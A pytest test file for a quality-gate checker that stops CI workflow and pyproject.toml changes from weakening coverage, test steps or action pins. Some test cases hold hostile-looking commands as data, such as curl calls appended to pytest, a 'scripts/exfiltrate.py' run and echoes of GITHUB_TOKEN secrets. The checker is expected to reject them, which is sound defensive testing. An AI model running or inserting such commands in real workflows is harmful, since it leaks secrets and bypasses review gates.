{old_header}
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
{new_header}
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.path == ".github/workflows/ci.yml"
    assert violation.section == section
    assert violation.line == line
    assert violation.reason == reason


@pytest.mark.unit
def test_violation_message_includes_file_section_line_and_reason() -> None:
    old_text = """
[tool.coverage.report]
fail_under = 99
""".strip()
    new_text = """
[tool.coverage.report]
fail_under = 80
""".strip()
    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    message = quality_gate_violation_message(violations)

    assert "pyproject.toml" in message
    assert "tool.coverage.report.fail_under" in message
    assert "line 2" in message
    assert "lowered from 99 to 80" in message
    assert "lowering or bypassing" not in message


@pytest.mark.unit
def test_missing_protected_file_diff_blocks_conservatively() -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
    )

    assert len(violations) == 1
    assert violations[0].section == "pyproject.toml"
    assert "diff unavailable" in violations[0].reason


@pytest.mark.unit
@pytest.mark.parametrize(
    ("old_text", "new_text", "expected_reason"),
    [
        (
            None,
            "[project]\nname = 'demo'\n",
            "new pyproject.toml file added outside declared owned_paths",
        ),
        (
            "[project]\nname = 'demo'\n",
            None,
            "pyproject.toml deleted outside declared owned_paths",
        ),
    ],
)
def test_pyproject_absent_diff_side_reports_file_lifecycle_reason(
    old_text: str | None,
    new_text: str | None,
    expected_reason: str,
) -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "pyproject.toml"
    assert violations[0].reason == expected_reason


@pytest.mark.unit
@pytest.mark.parametrize(
    ("old_text", "new_text", "expected_reason"),
    [
        (
            None,
            "name: CI\non: [pull_request]\njobs: {}\n",
            "new workflow file added outside declared owned_paths",
        ),
        (
            "name: CI\non: [pull_request]\njobs: {}\n",
            None,
            "workflow file deleted outside declared owned_paths",
        ),
    ],
)
def test_workflow_absent_diff_side_reports_file_lifecycle_reason(
    old_text: str | None,
    new_text: str | None,
    expected_reason: str,
) -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == ".github/workflows/ci.yml"
    assert violations[0].reason == expected_reason


@pytest.mark.unit
def test_identical_pyproject_diff_has_no_quality_gate_violation() -> None:
    text = """
[project]
name = "demo"
dependencies = [
    "fastapi>=0.115.0",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=text,
                new_text=text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_identical_workflow_diff_has_no_quality_gate_violation() -> None:
    text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=text,
                new_text=text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_parse_failure_blocks_conservatively() -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text="[project]\nname = 'demo'\n",
                new_text="[project\nname = 'demo'\n",
            )
        },
    )

    assert len(violations) == 1
    assert "could not parse pyproject.toml" in violations[0].reason


@pytest.mark.unit
def test_plan_only_output_detects_internal_plan_artifacts() -> None:
    assert changed_paths_are_only_internal_plan_artifacts(
        [
            "docs/awf-plans/ws_123.md",
            "./docs/awf-plans/ws_123.conformance.json",
        ]
    )


@pytest.mark.unit
def test_plan_only_output_allows_real_docs_and_source_changes() -> None:
    assert not changed_paths_are_only_internal_plan_artifacts(["docs/PROJECT_ONBOARDING.md"])
    assert not changed_paths_are_only_internal_plan_artifacts(
        ["docs/awf-plans/ws_123.md", "src/awf/control/executor.py"]
    )
    assert not changed_paths_are_only_internal_plan_artifacts([])


@pytest.mark.unit
def test_plan_only_output_message_is_operator_visible() -> None:
    message = plan_only_output_message(
        ["docs/awf-plans/ws_123.md", "docs/awf-plans/ws_123.conformance.json"]
    )

    assert "only AWF plan/conformance artifact" in message
    assert "docs/awf-plans/ws_123.md" in message


@pytest.mark.unit
def test_violation_message_reports_overflow_count() -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=[
            ".awf/workspace.yml",
            ".coveragerc",
            ".github/workflows/ci.yml",
            "pyproject.toml",
            "pytest.ini",
            "setup.cfg",
            "setup.py",
            "tox.ini",
            ".github/workflows/release.yml",
        ],
        owned_paths=[],
    )

    message = quality_gate_violation_message(violations)

    assert ".awf/workspace.yml" in message
    assert "and 1 more" in message


@pytest.mark.unit
def test_quality_gate_detail_and_pattern_helpers_expose_stable_policy_payloads() -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=["./pyproject.toml", "src/awf/control/executor.py"],
        owned_paths=[],
    )

    assert quality_gate_violation_details(violations) == [
        {
            "path": "pyproject.toml",
            "protected_pattern": "pyproject.toml",
            "section": "pyproject.toml",
            "line": None,
            "reason": "diff unavailable for protected pyproject.toml change",
        }
    ]
    assert protected_quality_gate_pattern(".\\.github\\workflows\\ci.yaml") == (
        ".github/workflows/"
    )
    assert protected_quality_gate_pattern("src/awf/control/executor.py") is None
    assert requires_protected_file_diff("pyproject.toml")
    assert requires_protected_file_diff(".github/workflows/release.yaml")
    assert not requires_protected_file_diff(".awf/workspace.yml")


@pytest.mark.unit
def test_pyproject_absent_both_sides_blocks_as_unavailable() -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=None,
                new_text=None,
            )
        },
    )

    assert len(violations) == 1
    assert (
        violations[0].reason
        == "could not read old and new pyproject.toml content for classification"
    )


@pytest.mark.unit
def test_old_pyproject_parse_failure_blocks_conservatively() -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text="[project\nname = 'demo'\n",
                new_text="[project]\nname = 'demo'\n",
            )
        },
    )

    assert len(violations) == 1
    assert "could not parse pyproject.toml" in violations[0].reason


@pytest.mark.unit
@pytest.mark.parametrize(
    ("old_text", "new_text", "section", "reason"),
    [
        (
            "[project]\nname = 'demo'\ndependencies = 'fastapi'\n",
            "[project]\nname = 'demo'\ndependencies = ['fastapi']\n",
            "project.dependencies",
            "dependency section has unsupported format: project.dependencies",
        ),
        (
            "[project]\nname = 'demo'\ndependencies = ['fastapi']\n",
            "[project]\nname = 'demo'\ndependencies = { fastapi = 'latest' }\n",
            "project.dependencies",
            "dependency section has unsupported format: project.dependencies",
        ),
        (
            "[project]\nname = 'demo'\noptional-dependencies = ['pytest']\n",
            "[project]\nname = 'demo'\noptional-dependencies = { dev = ['pytest'] }\n",
            "project.optional-dependencies",
            "dependency group section has unsupported format: project.optional-dependencies",
        ),
        (
            "[project]\nname = 'demo'\noptional-dependencies = { dev = ['pytest'] }\n",
            "[project]\nname = 'demo'\noptional-dependencies = ['pytest']\n",
            "project.optional-dependencies",
            "dependency group section has unsupported format: project.optional-dependencies",
        ),
        (
            "[project.optional-dependencies]\ndev = ['pytest']\ndocs = ['mkdocs']\n",
            "[project.optional-dependencies]\ndev = ['pytest']\n",
            "project.optional-dependencies.docs",
            "dependency group removed: project.optional-dependencies.docs",
        ),
        (
            "[project.optional-dependencies]\ndev = ['pytest']\n",
            "[project.optional-dependencies]\ndev = ['pytest']\ndocs = 'mkdocs'\n",
            "project.optional-dependencies.docs",
            "dependency group has unsupported format: project.optional-dependencies.docs",
        ),
        (
            "[project]\nname = 'demo'\ndependencies = ['fastapi']\n",
            "[project]\nname = 'demo'\ndependencies = ['fastapi', 1]\n",
            "project.dependencies",
            "dependency section has unsupported format: project.dependencies",
        ),
        (
            "[project]\nname = 'demo'\ndependencies = ['fastapi']\n",
            "[project]\nname = 'demo'\ndependencies = ['fastapi', '']\n",
            "project.dependencies",
            "dependency section has unsupported format: project.dependencies",
        ),
    ],
)
def test_pyproject_unsupported_dependency_shapes_block_with_specific_reason(
    old_text: str,
    new_text: str,
    section: str,
    reason: str,
) -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == section
    assert violations[0].reason == reason


@pytest.mark.unit
@pytest.mark.parametrize(
    ("old_text", "new_text", "section", "reason_fragment"),
    [
        (
            "project = 'demo'\n",
            "[project]\nname = 'demo'\n",
            "project",
            "project section has unsupported format",
        ),
        (
            "[project]\nname = 'demo'\n",
            "project = 'demo'\n",
            "project",
            "project section has unsupported format",
        ),
        (
            "[project]\nname = 'demo'\n",
            "[project]\nname = 'demo'\nscripts = { awf = 'awf.cli:app' }\n",
            "project.scripts",
            "pyproject project section changed outside allowed metadata",
        ),
        (
            "tool = 'demo'\n",
            "[tool.black]\nline-length = 100\n",
            "tool",
            "tool section has unsupported format",
        ),
        (
            "[tool.black]\nline-length = 100\n",
            "tool = 'demo'\n",
            "tool",
            "tool section has unsupported format",
        ),
    ],
)
def test_pyproject_unknown_or_unsupported_project_and_tool_shapes_are_blocked(
    old_text: str,
    new_text: str,
    section: str,
    reason_fragment: str,
) -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == section
    assert reason_fragment in violations[0].reason


@pytest.mark.unit
@pytest.mark.parametrize(
    ("old_text", "new_text", "section", "reason_fragment"),
    [
        (
            "name: CI\non: [pull_request\njobs: {}\n",
            "name: CI\non: [pull_request]\njobs: {}\n",
            ".github/workflows/ci.yml",
            "could not parse workflow YAML safely",
        ),
        (
            "name: CI\non: [pull_request]\njobs: {}\n",
            "name: CI\non: [pull_request\njobs: {}\n",
            ".github/workflows/ci.yml",
            "could not parse workflow YAML safely",
        ),
        (
            "name: CI\non: [pull_request]\njobs: {}\n",
            "- not\n- a\n- mapping\n",
            ".github/workflows/ci.yml",
            "workflow YAML root has unsupported format",
        ),
        (
            "name: CI\non: [pull_request]\n",
            "name: CI changed\non: [pull_request]\n",
            "workflow.name",
            "workflow top-level field changed outside allowed cases: name",
        ),
        (
            "name: CI\non: [pull_request]\njobs: []\n",
            "name: CI\non: [pull_request]\njobs: {}\n",
            "jobs",
            "workflow jobs section has unsupported format",
        ),
        (
            "name: CI\non: [pull_request]\njobs: {}\n",
            "name: CI\non: [pull_request]\njobs: []\n",
            "jobs",
            "workflow jobs section has unsupported format",
        ),
        (
            "name: CI\non: [pull_request]\njobs:\n  tests: invalid\n",
            "name: CI\non: [pull_request]\njobs:\n  tests: invalid changed\n",
            "jobs.tests",
            "workflow job has unsupported format",
        ),
    ],
)
def test_workflow_parse_and_shape_failures_block_conservatively(
    old_text: str,
    new_text: str,
    section: str,
    reason_fragment: str,
) -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == section
    assert reason_fragment in violations[0].reason


@pytest.mark.unit
def test_workflow_existing_step_same_id_allows_display_name_change() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - id: unit-tests
        name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - id: unit-tests
        name: Run unit tests
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
@pytest.mark.parametrize(
    ("old_job", "new_job", "section", "reason_fragment"),
    [
        (
            "if: github.event_name == 'pull_request'\n    runs-on: ubuntu-latest\n    steps:\n"
            "      - name: Run pytest\n        run: uv run pytest",
            "if: always()\n    runs-on: ubuntu-latest\n    steps:\n"
            "      - name: Run pytest\n        run: uv run pytest",
            "jobs.tests.if",
            "workflow gate if changed",
        ),
        (
            "runs-on: ubuntu-latest\n    steps: echo nope",
            "runs-on: ubuntu-latest\n    steps:\n      - name: Run pytest\n        run: uv run pytest",
            "jobs.tests.steps",
            "workflow steps have unsupported format",
        ),
        (
            "runs-on: ubuntu-latest\n    steps:\n      - name: Run pytest\n        run: uv run pytest",
            "runs-on: ubuntu-latest\n    steps: echo nope",
            "jobs.tests.steps",
            "workflow steps have unsupported format",
        ),
        (
            "runs-on: ubuntu-latest\n    steps:\n      - name: Run pytest\n        run: uv run pytest",
            "runs-on: ubuntu-latest\n    steps: []",
            "jobs.tests.steps.Run pytest",
            "workflow step removed",
        ),
        (
            "runs-on: ubuntu-latest\n    steps:\n      - name: Run pytest\n        run: uv run pytest",
            "runs-on: ubuntu-24.04\n    steps:\n      - name: Run pytest\n        run: uv run pytest",
            "jobs.tests",
            "workflow job changed outside allowed fields",
        ),
        (
            "runs-on: ubuntu-latest\n    steps:\n      - name: Run pytest\n        run: uv run pytest",
            "runs-on: ubuntu-latest\n    steps:\n      - name: Run pytest\n        if: always()\n        run: uv run pytest",
            "jobs.tests.steps.Run pytest.if",
            "workflow gate if changed",
        ),
        (
            "runs-on: ubuntu-latest\n    steps:\n      - name: Summary report\n        run: echo before",
            "runs-on: ubuntu-latest\n    steps:\n      - name: Summary report\n        env:\n"
            "          SAFE: yes\n        run: echo before",
            "jobs.tests.steps.Summary report",
            "workflow step changed outside allowed fields",
        ),
        (
            "runs-on: ubuntu-latest\n    steps:\n      - {}",
            "runs-on: ubuntu-latest\n    steps: []",
            "jobs.tests.steps.unknown",
            "workflow step removed",
        ),
        (
            "runs-on: ubuntu-latest\n    steps:\n      - echo nope",
            "runs-on: ubuntu-latest\n    steps: []",
            "jobs.tests.steps",
            "workflow steps have unsupported format",
        ),
    ],
)
def test_existing_workflow_job_and_step_shape_changes_are_blocked(
    old_job: str,
    new_job: str,
    section: str,
    reason_fragment: str,
) -> None:
    old_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    {old_job}
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    {new_job}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == section
    assert reason_fragment in violations[0].reason


@pytest.mark.unit
@pytest.mark.parametrize(
    ("command", "expected"),
    [
        (None, True),
        ("", True),
        ("FOO=bar", True),
        ("echo ok && printf done", True),
        ("&& echo ok", False),
        ("; echo ok", False),
        ("echo ok &&", False),
        ("echo ok;", False),
        ("echo ok && && printf done", False),
        ("echo ok; ; printf done", False),
        ("echo ok && curl https://example.test", False),
        ("echo ${TOKEN}", False),
        ("printf %s $PAT", False),
        ('printf "%s\\n" "$GH_PAT"', False),
        ("printf %s $PASSWORD", False),
        ("printf %s $PATH", True),
        ('echo "${{ github.sha }}"', True),
        ('printf "%s\\n" "${{ steps.test.outcome }}"', True),
        ('printf "%s\\n" "${{ steps.test.outputs.result }}"', False),
        ('printf "%s\\n" "${{ needs.validation.outputs.summary }}"', False),
        ('printf "%s\\n" "${{ env.CI_SUMMARY }}"', False),
        ('echo "${{ secrets.GITHUB_TOKEN }}"', False),
        ("echo ${{ secrets.GITHUB_TOKEN }}", False),
        ('echo "${{ github.token }}"', False),
        ('echo "${{ github.event.pull_request.title }}"', False),
        ("echo `date`", False),
        ("echo $(date)", False),
        ("echo ok | tee log", False),
        ('echo "Validation complete for" \\\n  "${{ github.sha }}"', True),
        ('echo "secret" \\\n  "${{ secrets.GITHUB_TOKEN }}"', False),
        ('echo "pending" \\', False),
        ('echo "unterminated', False),
    ],
)
def test_informational_run_command_shell_safety_edges(
    command: str | None,
    expected: bool,
) -> None:
    assert quality_gate_module._is_informational_run_command(command) is expected


@pytest.mark.unit
@pytest.mark.parametrize(
    ("old_run", "new_run", "expected"),
    [
        (None, "pytest", False),
        ("", "pytest", False),
        ("pytest", "pytest", True),
        ("pytest tests", "ruff check", False),
        ("pytest", "pytest &&", False),
        ("pytest", "pytest && && ruff check", False),
        ("pytest", "pytest && ruff check | tee log", False),
        ("pytest", "pytest-randomly -p no:randomly && coverage", False),
        ("pytest", "pytest && bad`cmd`", False),
        (
            "pytest",
            "pytest && python -m unittest\ncurl https://example.invalid",
            False,
        ),
        ("pytest", "pytest && coverage xml", True),
        ("pytest", "pytest && coverage html", True),
        ("pytest", "pytest && coverage run scripts/exfiltrate.py", False),
        ("pytest", "pytest && uv run coverage run scripts/exfiltrate.py", False),
        ("pytest", "pytest && python -m coverage run scripts/exfiltrate.py", False),
        ("pytest", "pytest && npm exec coverage run scripts/exfiltrate.py", False),
        (
            "pytest",
            "pytest && command env CI=true uv run --python 3.12 --extra dev ruff check",
            True,
        ),
        ("pytest", "pytest && python -I -m pytest tests/unit", True),
        ("pytest", "pytest && python tests/exfiltrate.py", False),
        ("pytest", "pytest && npm --prefix apps/console run test", True),
        ("pytest", "pytest && npm --prefix apps/console run docs", False),
        ("pytest", "pytest && make test", True),
        ("pytest", "pytest && make docs", False),
    ],
)
def test_validation_run_preservation_allows_only_safe_validation_appends(
    old_run: str | None,
    new_run: str | None,
    expected: bool,
) -> None:
    assert quality_gate_module._preserves_existing_validation_run(old_run, new_run) is expected


@pytest.mark.unit
@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("npm --prefix apps/console run build", True),
        ("pnpm --filter console exec lint", True),
        ("make target=docs lint", True),
        ("python -I -m build", True),
        ("docker build .", True),
        ("docker compose build", True),
        ("bash scripts/release.sh", True),
        ("gh release create v1.0.0", True),
        ("gcloud run deploy api", True),
        ("firebase deploy", True),
        ("twine upload dist/*", True),
        ("env FOO=bar echo release", False),
    ],
)
def test_broad_validation_command_detection_covers_wrappers_and_deploy_tools(
    command: str,
    expected: bool,
) -> None:
    assert quality_gate_module._has_broad_validation_command_invocation(command) is expected


@pytest.mark.unit
@pytest.mark.parametrize(
    ("old_uses", "new_uses", "expected"),
    [
        ("actions/checkout", "actions/checkout@v4", False),
        ("actions/checkout@v4", "actions/checkout@v4", False),
        ("actions/checkout@v4", "actions/setup-python@v5", False),
        ("actions/checkout@main", "actions/checkout@v4", False),
        ("actions/checkout@v4", "actions/checkout@main", False),
        (
            "actions/checkout@v4",
            "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
            False,
        ),
        (
            "actions/checkout@v4.2.0",
            "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
            False,
        ),
        (
            "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
            "actions/checkout@44bd71901bbe5b1630ceea73d27597364c9af683",
            False,
        ),
        (
            "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
            "actions/checkout@v4.2.0",
            True,
        ),
        ("actions/setup-python@v1.0.0", "actions/setup-python@v1.0.0-rc.1", False),
        ("actions/setup-python@v1.0.0-rc.1", "actions/setup-python@v1.0.0", True),
        ("actions/setup-python@v1.0.0+1", "actions/setup-python@v1.0.0+2", True),
    ],
)
def test_pinned_uses_bump_edges_require_same_action_and_ordered_pinned_refs(
    old_uses: str,
    new_uses: str,
    expected: bool,
) -> None:
    assert quality_gate_module._is_pinned_uses_bump(old_uses, new_uses) is expected


@pytest.mark.unit
def test_line_lookup_helpers_cover_fallback_paths() -> None:
    assert (
        quality_gate_module._line_for_toml_section_or_descendant(
            "[tool.coverage]\nbranch = true\n",
            "tool.coverage",
        )
        == 1
    )
    assert (
        quality_gate_module._line_for_toml_section_or_descendant(
            "[tool.coverage.report]\nfail_under = 99\n",
            "tool.coverage",
        )
        == 1
    )
    assert (
        quality_gate_module._line_for_toml_key(
            "[project]\nname = 'demo'\n",
            section="project",
            key="missing",
        )
        == 1
    )
    assert quality_gate_module._line_for_yaml_key("name: CI\n", "jobs") is None
    assert (
        quality_gate_module._line_for_workflow_step(
            "steps:\n  - run: |\n      echo hi\n",
            {"name": "missing"},
        )
        is None
    )
    assert (
        quality_gate_module._line_for_workflow_step_key(
            "run: echo hi\n",
            {"run": "echo hi"},
            key="uses",
        )
        is None
    )
    assert (
        quality_gate_module._line_for_workflow_step_key(
            "run: echo hi\nuses: actions/checkout@v4\n",
            {"run": "echo hi"},
            key="uses",
        )
        == 2
    )
    assert (
        quality_gate_module._line_for_workflow_step_key(
            "run: echo hi\n",
            {"name": "missing"},
            key="run",
        )
        == 1
    )
    workflow_with_multiline_run = """
steps:
  - name: First summary
    run: echo first
    continue-on-error: true
  - run: |
      echo second
      echo done
    continue-on-error: true
""".strip()
    multiline_run_step = {
        "run": "echo second\necho done\n",
        "continue-on-error": True,
    }
    assert (
        quality_gate_module._line_for_workflow_step(
            workflow_with_multiline_run,
            multiline_run_step,
        )
        == 5
    )
    assert (
        quality_gate_module._line_for_workflow_step_key(
            workflow_with_multiline_run,
            multiline_run_step,
            key="continue-on-error",
        )
        == 8
    )


@pytest.mark.unit
def test_pyproject_new_optional_dependency_group_is_allowed() -> None:
    old_text = """
[project.optional-dependencies]
dev = ["pytest"]
""".strip()
    new_text = """
[project.optional-dependencies]
dev = ["pytest"]
docs = ["mkdocs"]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_pyproject_unchanged_unknown_sections_are_not_reported() -> None:
    old_text = """
[project]
name = "demo"
scripts = { awf = "awf.cli:app" }

[tool.black]
line-length = 100

[custom]
enabled = true
""".strip()
    new_text = """
[project]
name = "demo"
scripts = { awf = "awf.cli:app" }
dependencies = ["fastapi"]

[tool.black]
line-length = 100

[custom]
enabled = true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_empty_yaml_is_treated_as_empty_mapping() -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text="",
                new_text="name: CI\n",
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "workflow.name"


@pytest.mark.unit
def test_workflow_parse_error_without_integer_mark_line_reports_unknown_line(monkeypatch) -> None:
    class _ProblemMark:
        line = "not-an-int"

    class _MarkedYamlError(quality_gate_module.yaml.YAMLError):
        problem_mark = _ProblemMark()

    def _raise_marked_error(_text: str) -> object:
        raise _MarkedYamlError("bad yaml")

    monkeypatch.setattr(quality_gate_module.yaml, "safe_load", _raise_marked_error)

    workflow, violation = quality_gate_module._parse_workflow_yaml(
        "name: CI\n",
        ".github/workflows/ci.yml",
        ".github/workflows/",
    )

    assert workflow is None
    assert violation is not None
    assert violation.line is None
    assert "could not parse workflow YAML safely" in violation.reason


@pytest.mark.unit
def test_private_coverage_policy_helper_handles_non_mapping_and_report_variants() -> None:
    assert quality_gate_module._coverage_policy_without_fail_under("strict") == "strict"
    assert quality_gate_module._coverage_policy_without_fail_under(
        {"run": {"branch": True}, "report": {"fail_under": 99}}
    ) == {"run": {"branch": True}}
    assert quality_gate_module._coverage_policy_without_fail_under(
        {"report": {"fail_under": 99, "show_missing": True}}
    ) == {"report": {"show_missing": True}}


@pytest.mark.unit
def test_private_dependency_replacement_helper_falls_back_to_existing_raw_entry() -> None:
    assert (
        quality_gate_module._replacement_dependency_raw(
            old_entries=quality_gate_module.Counter({"fastapi>=1": 1}),
            new_entries=quality_gate_module.Counter({"fastapi>=1": 1}),
        )
        == "fastapi>=1"
    )


@pytest.mark.unit
def test_private_workflow_shape_helpers_cover_empty_and_invalid_edges() -> None:
    assert quality_gate_module._workflow_steps({}) == []
    assert quality_gate_module._is_informational_job("tests", {"steps": []}) is False
    assert (
        quality_gate_module._is_informational_job(
            "summary",
            {"name": "Summary report", "steps": "echo ok"},
        )
        is False
    )
    assert (
        quality_gate_module._is_informational_job(
            "summary",
            {
                "name": "Summary report",
                "permissions": {"contents": 1},
                "steps": [{"name": "Summary report", "run": "echo ok"}],
            },
        )
        is False
    )
    assert (
        quality_gate_module._is_informational_job(
            "summary",
            {
                "name": "Summary report",
                "permissions": {"pull-requests": "admin"},
                "steps": [{"name": "Summary report", "run": "echo ok"}],
            },
        )
        is False
    )
    assert (
        quality_gate_module._is_informational_job(
            "summary",
            {
                "name": "Summary report",
                "permissions": {"packages": "write"},
                "steps": [{"name": "Summary report", "run": "echo ok"}],
            },
        )
        is False
    )
    assert quality_gate_module._is_informational_step({"name": "Deploy", "run": "echo ok"}) is False


@pytest.mark.unit
def test_private_shell_and_validation_helpers_cover_remaining_parser_edges() -> None:
    assert quality_gate_module._informational_shell_command_is_safe(()) is True
    assert quality_gate_module._validation_run_append_commands("; ruff check") is None
    assert quality_gate_module._preserves_existing_validation_run(
        "pytest",
        "pytest && ruff check && pytest tests/unit",
    )
    assert not quality_gate_module._preserves_existing_validation_run(
        "pytest",
        "pytest && env CI=true",
    )
    assert not quality_gate_module._preserves_existing_validation_run(
        "pytest",
        "pytest && npm --prefix apps/console",
    )
    assert not quality_gate_module._preserves_existing_validation_run(
        "pytest",
        "pytest && npm run --",
    )
    assert quality_gate_module._has_broad_validation_command_invocation("build")
    assert not quality_gate_module._has_broad_validation_command_invocation(
        "npm --prefix apps/console"
    )
    assert not quality_gate_module._has_broad_validation_command_invocation("python build.py")
    assert not quality_gate_module._docker_runs_broad_validation_command(())


@pytest.mark.unit
def test_private_uses_ref_helpers_cover_invalid_and_short_version_edges() -> None:
    assert not quality_gate_module._is_comment_or_notify_capable_step_uses(
        {},
        "actions/github-script",
    )
    assert not quality_gate_module._is_workflow_version_ref_non_downgrade("v1", "main")
    assert not quality_gate_module._is_full_workflow_version_ref("main")
    assert quality_gate_module._workflow_version_ref_sort_key("main") is None
    assert quality_gate_module._workflow_version_ref_sort_key("v1")[0] == (1, 0, 0)
    assert quality_gate_module._uses_action("actions/checkout") is None
